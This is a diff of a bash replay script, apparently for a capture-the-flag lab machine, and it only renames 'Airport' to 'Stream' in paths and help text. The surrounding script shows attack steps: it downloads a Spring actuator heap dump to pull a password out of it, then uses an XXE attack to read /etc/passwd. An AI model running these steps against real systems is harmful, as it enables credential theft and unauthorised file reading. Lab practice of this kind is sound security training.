@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# Operator replay for Airport. No secrets in this file.
+# Operator replay for Stream. No secrets in this file.
 #   export TARGET=10.129.x.x CH_PASS=...   # from heap
 #   ./replay.sh heap
 #   ./replay.sh xxe /etc/passwd
@@ -30,10 +30,10 @@ case "$cmd" in
     ;;
   heap)
     need_target
-    mkdir -p /tmp/airport-heap
+    mkdir -p /tmp/stream-heap
     echo "[*] GET $API/actuator/heapdump"
-    curl -fsS -o /tmp/airport-heap/heap.bin "$API/actuator/heapdump"
-    python3 "$SCRIPT_DIR/heap_extract.py" /tmp/airport-heap/heap.bin
+    curl -fsS -o /tmp/stream-heap/heap.bin "$API/actuator/heapdump"
+    python3 "$SCRIPT_DIR/heap_extract.py" /tmp/stream-heap/heap.bin
     echo "[*] set CH_PASS from the setPassword neighbourhood, then: $0 xxe /etc/passwd"
     ;;
   xxe)
@@ -56,7 +56,7 @@ case "$cmd" in
     ;;
   help|*)
     cat <<EOF
-Airport replay (export TARGET, CH_PASS, CH_DEFAULT_PASS)
+Stream replay (export TARGET, CH_PASS, CH_DEFAULT_PASS)
 
   $0 hosts              print /etc/hosts line
   $0 heap               download actuator heapdump + extract
